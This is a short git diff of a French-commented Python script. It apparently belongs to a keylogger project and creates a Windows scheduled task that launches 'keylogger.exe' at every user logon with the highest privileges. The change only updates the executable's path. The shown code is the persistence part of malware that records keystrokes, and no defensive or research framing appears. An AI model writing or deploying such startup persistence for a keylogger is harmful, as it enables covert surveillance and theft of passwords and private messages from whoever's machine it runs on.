@@ -15,7 +15,7 @@ import os
 #--------DÉBUT TÂCHES PROGRAMMÉES---------------
 
 # Définir le chemin de l'exécutable
-executable_path = os.path.join(os.getcwd(), 'keyloggerWindows.exe')
+executable_path = os.path.join(os.getcwd(), 'dist', 'keylogger.exe')
 
 # Définir les paramètres de la tâche planifiée
 task_name = "Mon programme au démarrage"
@@ -26,6 +26,7 @@ task_command = (
     f'schtasks /create /tn "{task_name}" /tr "cmd /c timeout /t {delay} & {executable_path}" '
     f'/sc onlogon /rl highest /f'
 )
+
 # Vérifier si la tâche existe déjà
 check_task = subprocess.run(['schtasks', '/query', '/tn', task_name], capture_output=True, text=True)
 
